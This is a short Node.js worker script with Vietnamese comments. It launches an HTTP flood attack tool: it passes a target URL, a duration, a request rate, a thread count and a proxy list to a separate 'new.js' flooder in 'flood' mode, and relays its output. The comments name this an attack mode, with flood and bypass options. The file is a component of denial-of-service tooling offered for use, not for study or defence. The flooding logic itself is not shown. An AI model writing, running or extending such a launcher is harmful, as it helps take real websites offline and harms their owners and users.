const { parentPort, workerData } = require('worker_threads');
const { spawn } = require('child_process');

// Nhận dữ liệu từ workerData
const { url, time, rate, thea, proxy } = workerData;

// Chế độ tấn công (flood hoặc bypass)
const mode = 'flood'; 

// Hàm chạy flooder.js
function runFlooder() {
    const flooder = spawn('node', ['new.js', url, time, rate, thea, proxy, mode]);

    flooder.stdout.on('data', (data) => {
        parentPort.postMessage(`Output: ${data.toString()}`);
    });

    flooder.stderr.on('data', (data) => {
        parentPort.postMessage(`Error: ${data.toString()}`);
    });

    flooder.on('exit', (code) => {
        parentPort.postMessage(`Flooder Success!: ${code}`);
        parentPort.close(); // Dừng worker khi xong
    });

    // Lắng nghe tín hiệu dừng worker
    parentPort.on('message', (msg) => {
        if (msg === 'stop') {
            flooder.kill();
            parentPort.close();
        }
    });
}

// Chạy flooder
runFlooder();
